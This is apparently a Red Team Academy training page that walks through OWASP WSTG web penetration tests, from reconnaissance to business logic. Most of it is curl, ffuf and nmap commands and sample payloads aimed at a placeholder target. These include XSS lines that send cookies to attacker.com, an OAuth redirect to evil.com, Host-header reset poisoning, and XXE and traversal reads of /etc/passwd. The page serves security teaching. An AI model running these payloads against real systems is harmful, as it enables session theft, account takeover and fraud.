---
layout: training-page
title: "OWASP WSTG Testing Guide — Red Team Academy"
module: "Web Hacking"
tags:
  - wstg
  - owasp
  - methodology
  - web-testing
  - session
  - business-logic
  - configuration
page_key: "web-wstg-testing-guide"
render_with_liquid: false
---

# OWASP Web Security Testing Guide (WSTG)

The OWASP Web Security Testing Guide (WSTG) is the authoritative framework for web application penetration testing. Each test is identified by a WSTG ID (e.g., WSTG-SESS-03) for use in reports and vulnerability tracking. This page covers the session management, configuration, business logic, and authorization testing categories — areas often under-tested compared to injection vulnerabilities.

## WSTG Testing Categories Overview

```
# WSTG-INFO: Information Gathering
# WSTG-CONF: Configuration and Deployment Management
# WSTG-IDNT: Identity Management
# WSTG-ATHN: Authentication Testing
# WSTG-ATHZ: Authorization Testing
# WSTG-SESS: Session Management Testing
# WSTG-INPV: Input Validation Testing
# WSTG-ERRH: Error Handling
# WSTG-CRYP: Weak Cryptography
# WSTG-BUSL: Business Logic Testing
# WSTG-CLNT: Client-side Testing
# WSTG-APIT: API Testing
```

## Information Gathering (WSTG-INFO)

```
# WSTG-INFO-01: Search engine discovery
# Google dorks to find exposed content:
site:target.com filetype:pdf
site:target.com "internal use only"
site:target.com ext:log OR ext:bak OR ext:sql
"target.com" inurl:admin
inurl:target.com intitle:"index of"

# WSTG-INFO-02: Web server fingerprinting
curl -I https://target.com | grep -i "server:\|x-powered-by:\|x-aspnet"
whatweb https://target.com
nmap -sV -p 80,443 target.com

# WSTG-INFO-03: Metafile review for information leakage
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml
curl https://target.com/.well-known/security.txt
curl https://target.com/humans.txt
curl https://target.com/crossdomain.xml    # Flash policy
curl https://target.com/clientaccesspolicy.xml  # Silverlight

# WSTG-INFO-04: Attack surface identification
# Enumerate subdomains, ports, technologies:
subfinder -d target.com | httpx -silent
nmap -sC -sV -p- --min-rate=5000 target.com
nuclei -u https://target.com -t technologies/

# WSTG-INFO-08: Framework fingerprinting
# Check response headers, cookies, error pages, HTML comments
# Common fingerprints:
# Rails: X-Runtime, _session_id cookie
# Django: csrftoken cookie, 403 debug page
# Laravel: laravel_session cookie
# WordPress: /wp-content/, /wp-login.php, wp-json/wp/v2/
```

## Configuration Testing (WSTG-CONF)

```
# WSTG-CONF-03: Sensitive file extensions
# Files that may expose source code or credentials when browsed:
curl https://target.com/index.php.bak
curl https://target.com/config.php~
curl https://target.com/.env
curl https://target.com/web.config
curl https://target.com/application.properties
curl https://target.com/database.yml
curl https://target.com/config.json
curl https://target.com/settings.py

# Wordlist for backup/config enumeration:
ffuf -u https://target.com/FUZZ \
     -w /opt/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt \
     -fc 404

# WSTG-CONF-04: Backup and unreferenced files
# Common backup file extensions to brute force:
# .bak .old .orig .tmp ~ .swp .save .copy .tar.gz .zip

# WSTG-CONF-05: Admin interface enumeration
ffuf -u https://target.com/FUZZ \
     -w /opt/SecLists/Discovery/Web-Content/AdminPanels.txt \
     -fc 404 -mc 200,301,302,403

# Common admin paths:
/admin  /administrator  /wp-admin  /login  /manage
/panel  /dashboard  /cp  /controlpanel  /phpmyadmin

# WSTG-CONF-06: HTTP method testing
curl -X OPTIONS https://target.com/ -v
curl -X TRACE https://target.com/ -v    # XST attack if enabled
curl -X PUT https://target.com/test.html -d "test"
# Dangerous: DELETE, PUT, CONNECT should be disabled

# WSTG-CONF-07: HSTS check
curl -I https://target.com | grep -i "strict-transport-security"
# Should see: Strict-Transport-Security: max-age=31536000; includeSubDomains

# WSTG-CONF-12: Content Security Policy
curl -I https://target.com | grep -i "content-security-policy"
# Weak CSP: unsafe-inline, unsafe-eval, * wildcards
# Use: https://csp-evaluator.withgoogle.com/

# WSTG-CONF-14: Security header review
curl -I https://target.com | grep -iE "x-frame-options|x-content-type|referrer-policy|permissions-policy"
# Missing X-Frame-Options → clickjacking possible
# Missing X-Content-Type-Options: nosniff → MIME sniffing attacks
```

## Authentication Testing (WSTG-ATHN)

```
# WSTG-ATHN-02: Default credentials
# Test before anything else on admin panels:
# admin:admin, admin:password, root:root, admin:1234
# Platform-specific defaults:
# WordPress: admin:admin
# Joomla: admin:admin
# Drupal: admin:admin
# Tomcat: tomcat:tomcat, tomcat:s3cret
# Jenkins: admin:admin (older versions)
# Grafana: admin:admin
# CMS Made Simple: admin:admin
# Use tool: https://github.com/AlessandroZ/LaZagne

# WSTG-ATHN-03: Account lockout
# Verify: does the application lock accounts after N failed attempts?
# Test: send 10+ wrong passwords, check if account locks or captcha appears
for i in $(seq 1 15); do
  curl -s -X POST https://target.com/login \
    -d "user=admin&pass=wrong$i" | grep -i "locked\|disabled\|captcha"
done

# WSTG-ATHN-04: Authentication bypass
# Test: access authenticated pages without a session cookie
curl -s https://target.com/admin/dashboard  # no cookie
# Force browsing: try guessing paths that skip auth

# WSTG-ATHN-09: Password reset weaknesses
# Predictable tokens: check if reset token is time-based or sequential
# Token leakage: check Referer header on reset page
# Host header injection: change Host header to attacker.com in reset request
curl -X POST https://target.com/reset-password \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"

# WSTG-ATHN-10: Alternative channel weaknesses
# If password reset works via email, test the mobile app or API endpoints
# for weaker auth that wasn't hardened along with the main app
```

## Session Management Testing (WSTG-SESS)

```
# WSTG-SESS-01: Session token analysis
# Collect 20+ tokens and analyze for patterns:
# - Are they predictable (sequential, time-based)?
# - Do they contain encoded user data?
# Decode JWT: echo "TOKEN_PAYLOAD" | base64 -d | jq
# Decode base64 session: echo "SESSION" | base64 -d

# Check randomness entropy:
for i in $(seq 1 10); do
  curl -s -c /dev/null -I https://target.com/login | grep -i "set-cookie"
done
# Compare the session IDs — are they random or sequential?

# WSTG-SESS-02: Cookie attribute review
# Required flags: Secure, HttpOnly, SameSite=Lax or Strict
# Check for overly broad Domain:
curl -I https://target.com/ | grep -i "set-cookie"
# Bad: Set-Cookie: sess=abc; Domain=.target.com (all subdomains get it)
# Bad: Set-Cookie: sess=abc (no Secure, no HttpOnly, no SameSite)

# WSTG-SESS-03: Session fixation
# 1. Get a session ID before login (unauthenticated)
PRE_AUTH_SESSION=$(curl -s -c - https://target.com/ | grep -i session | awk '{print $7}')
# 2. Login with that session ID
curl -s -c - -b "session=$PRE_AUTH_SESSION" -X POST https://target.com/login \
  -d "user=testuser&pass=testpass" | head
# 3. If session ID is the same after login → session fixation vulnerability

# WSTG-SESS-04: Session variable exposure
# Check: is the session ID in URL parameters?
https://target.com/profile?sessionid=abc123
# Check: is it in the referrer header to third parties?
# Check: is it in page source (JavaScript variables)?
grep -i "session\|token\|auth" response.html

# WSTG-SESS-06: Logout validation
# After logout, attempt to reuse the old session token:
curl -s -b "session=OLD_TOKEN" https://target.com/admin
# Should return 302 to login or 401 — not the protected page

# WSTG-SESS-07: Session timeout
# Note the time the session was issued
# Wait 30 minutes of inactivity
# Attempt to use the old session token
# Good: session rejected after timeout
# Bad: session still valid indefinitely

# WSTG-SESS-08: Session puzzling (session variable overloading)
# When one session variable controls multiple security decisions:
# 1. Login as normal user, note session structure
# 2. Use the same session variable for a different operation
# E.g., if "role" is set in session to "user", can you set it to "admin"?

# WSTG-SESS-09: Session hijacking via network
# If HTTPS is not enforced, sessions can be stolen:
# Test: can you access the app over HTTP? Does it redirect?
curl -I http://target.com/login
# Should redirect to https:// — if not, session can be sniffed

# WSTG-SESS-11: Concurrent sessions
# Log in twice from different browsers with same account
# Both sessions should work — but check for account controls that
# restrict simultaneous logins (e.g., banking apps)
```

## Authorization Testing (WSTG-ATHZ)

```
# WSTG-ATHZ-01: Directory traversal / file include
# See: LFI testing section
# Test URL path traversal in addition to parameter traversal:
https://target.com/../../../etc/passwd
https://target.com/files/%2e%2e%2f%2e%2e%2fetc%2fpasswd

# WSTG-ATHZ-02: Authorization schema bypass
# Test: can a low-privileged user access admin functions by changing the URL?
# User has: GET /user/profile
# Admin has: GET /admin/users — test with user session token
curl -s -b "session=USER_TOKEN" https://target.com/admin/users
curl -s -b "session=USER_TOKEN" https://target.com/api/admin/reset-all

# HTTP method bypass:
# If GET /admin is blocked for users, try POST, PUT, PATCH:
curl -X POST -b "session=USER_TOKEN" https://target.com/admin/users

# WSTG-ATHZ-03: Privilege escalation
# Horizontal: user A accesses user B's data
# Vertical: user escalates to admin role
# Change role/group parameters in requests:
curl -s -b "session=USER_TOKEN" -X POST https://target.com/profile/update \
  -d "role=admin&user_id=1"

# WSTG-ATHZ-04: IDOR
# See dedicated IDOR page
# Quick test: substitute your own object ID for another user's:
# /api/invoices/1001 → try /api/invoices/1002, /api/invoices/1003
# /api/users/me → try /api/users/2, /api/users/3

# WSTG-ATHZ-05: OAuth weaknesses
# Test redirect_uri validation (open redirect to steal code):
https://target.com/oauth/authorize?response_type=code&client_id=APP&redirect_uri=https://evil.com
# Test state parameter (CSRF in OAuth flow)
# Test for token leakage in referrer headers
```

## Business Logic Testing (WSTG-BUSL)

```
# Business logic flaws require manual testing — scanners miss these entirely.
# Think about what the developer intended vs. what's actually enforced.

# WSTG-BUSL-01: Data validation bypass
# Negative prices on e-commerce:
POST /cart/add
{"item_id": "123", "quantity": -1, "price": -9.99}
# Result: do you get a refund/credit?

# Exceed account limits:
# If a free account allows 5 projects, create 4 then batch-create many at once
# Race condition: two simultaneous requests to create item 5 and 6

# WSTG-BUSL-02: Request forging
# Replay earlier requests out of order:
# In a multi-step checkout (cart → address → payment → confirm):
# Skip address step, POST directly to payment step
# Does the server validate that all prior steps completed?

# WSTG-BUSL-04: Process timing attacks
# Time-sensitive operations (promotions, flash sales):
# Send request exactly when a sale starts (sub-millisecond timing)
# Exploit race conditions in coupon redemption:
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/apply-coupon -d "code=SAVE50" &
done
wait

# WSTG-BUSL-05: Function rate limits
# Functions that should only be used once:
# - One referral bonus per account
# - One vote per user per item
# - One free trial per email
# Test: can you bypass with different email, IP, browser fingerprint?

# WSTG-BUSL-06: Workflow circumvention
# Multi-step process bypass:
# Password reset → verify email → set new password
# Test: can you go directly to step 3 without completing step 2?
# Booking flow → seat selection → add-ons → payment
# Test: can you modify price in add-ons request without affecting totals?

# WSTG-BUSL-10: Payment logic flaws
# Change price in the payment request:
POST /checkout/process
{"amount": "0.01", "currency": "USD", "items": [{"id": "premium", "price": 99.99}]}
# Apply 100% discount code if one exists
# Test for negative balance exploitation
# Test currency confusion (pay in a weaker currency than billed)
```

## Input Validation Testing (WSTG-INPV)

```
# WSTG-INPV-01: Reflected XSS
# Test every parameter that reflects in the response:
# See: web/xss.html for full payload list

# WSTG-INPV-02: Stored XSS
# Test every input stored and later rendered (comments, profiles, filenames):
<script>document.location='https://attacker.com/?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com/?'+document.cookie)">

# WSTG-INPV-03: HTTP verb tampering
# Test HTTP method overrides:
POST /admin/delete -H "X-HTTP-Method-Override: DELETE"
POST /admin/delete -d "_method=DELETE"
# Some frameworks honor these headers even when DELETE is blocked

# WSTG-INPV-04: HTTP parameter pollution
# Duplicate parameters — different parsers handle them differently:
GET /transfer?amount=1000&destination=attacker_account&destination=victim_account
# Which destination does the server use? First? Last? Both?

# WSTG-INPV-05 through 05.8: SQL injection
# See: web/sql-injection.html

# WSTG-INPV-07: XML injection
# For SOAP/XML endpoints:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
# See: web/xxe.html

# WSTG-INPV-11: LFI/RFI
# See: LFI section in top-25-parameters page

# WSTG-INPV-12: Command injection
# See: RCE section in top-25-parameters page

# WSTG-INPV-18: SSTI
# See: web/ssti.html

# WSTG-INPV-19: SSRF
# See: web/ssrf.html

# WSTG-INPV-20: Mass assignment
# REST APIs that auto-map JSON body to object fields:
PUT /api/user/profile
{"name": "Alice", "email": "alice@test.com", "role": "admin", "credits": 9999}
# Does the server accept the "role" and "credits" fields?
```

## API Testing (WSTG-APIT)

```
# WSTG-APIT-01: Reconnaissance
# Discover API endpoints:
ffuf -u https://target.com/api/FUZZ \
     -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt
cat js_files.txt | grep -oE '"/api/[^"]*"' | sort -u

# Check for API documentation:
curl https://target.com/swagger.json
curl https://target.com/swagger-ui/
curl https://target.com/api-docs
curl https://target.com/openapi.json
curl https://target.com/v1/swagger.json

# WSTG-APIT-02: Authentication checks
# Test each API endpoint without authentication:
curl -s https://target.com/api/users      # no Authorization header
curl -s https://target.com/api/admin/all  # no Authorization header
# Test with expired JWT:
curl -s -H "Authorization: Bearer EXPIRED_JWT" https://target.com/api/users

# WSTG-APIT-03: Injection in API parameters
# API endpoints accept JSON — test same injections as web forms:
POST /api/search
{"query": "' OR 1=1--"}

POST /api/file
{"path": "../../../etc/passwd"}

POST /api/render
{"template": "{{7*7}}"}  # SSTI

# BOLA (Broken Object Level Authorization) — API-specific IDOR:
# Normal: GET /api/orders/ORDER_ID_MINE
# Attack: GET /api/orders/ORDER_ID_OTHER_USER
# Find object IDs in your own responses, substitute others

# BFLA (Broken Function Level Authorization) — API-specific privilege escalation:
# Normal user endpoint: GET /api/v1/users/me
# Admin endpoint: DELETE /api/v1/users/2  ← try with user JWT
curl -X DELETE -H "Authorization: Bearer USER_JWT" https://target.com/api/v1/users/5
```

## WSTG Test Reference Table

```
# Quick reference: WSTG ID → test category

# Information Gathering:
# WSTG-INFO-01  Search engine discovery
# WSTG-INFO-02  Web server fingerprinting
# WSTG-INFO-04  Attack surface identification
# WSTG-INFO-08  Framework fingerprinting

# Configuration:
# WSTG-CONF-03  Sensitive file extensions (.bak, .env, .config)
# WSTG-CONF-05  Admin interface enumeration
# WSTG-CONF-06  HTTP method testing (TRACE, PUT, DELETE)
# WSTG-CONF-07  HSTS validation
# WSTG-CONF-10  Subdomain takeover
# WSTG-CONF-12  Content Security Policy review
# WSTG-CONF-14  Security headers review

# Authentication:
# WSTG-ATHN-02  Default credentials
# WSTG-ATHN-03  Account lockout mechanism
# WSTG-ATHN-04  Authentication bypass
# WSTG-ATHN-09  Password reset weaknesses

# Session Management:
# WSTG-SESS-01  Session token analysis (entropy, predictability)
# WSTG-SESS-02  Cookie attributes (Secure, HttpOnly, SameSite)
# WSTG-SESS-03  Session fixation
# WSTG-SESS-06  Logout validation
# WSTG-SESS-07  Session timeout

# Authorization:
# WSTG-ATHZ-02  Authorization bypass (force browsing, method switching)
# WSTG-ATHZ-03  Privilege escalation (horizontal + vertical)
# WSTG-ATHZ-04  IDOR

# Input Validation:
# WSTG-INPV-01  Reflected XSS
# WSTG-INPV-02  Stored XSS
# WSTG-INPV-05  SQL injection
# WSTG-INPV-07  XML injection / XXE
# WSTG-INPV-11  LFI / RFI
# WSTG-INPV-12  Command injection
# WSTG-INPV-18  SSTI
# WSTG-INPV-19  SSRF
# WSTG-INPV-20  Mass assignment

# Business Logic:
# WSTG-BUSL-01  Data validation bypass
# WSTG-BUSL-02  Forged requests (step skipping)
# WSTG-BUSL-04  Process timing (race conditions)
# WSTG-BUSL-05  Function rate limit bypass
# WSTG-BUSL-06  Workflow circumvention
# WSTG-BUSL-10  Payment logic flaws
```

## Resources

- OWASP WSTG v4.2 (stable) — `owasp.org/www-project-web-security-testing-guide/v42/`
- WSTG GitHub — `github.com/OWASP/wstg`
- OWASP Testing Guide PDF — `github.com/OWASP/wstg/releases/tag/v4.2`
- OWASP API Security Top 10 — `owasp.org/www-project-api-security/`
- PortSwigger Web Security Academy — `portswigger.net/web-security`
- CSP Evaluator — `csp-evaluator.withgoogle.com`
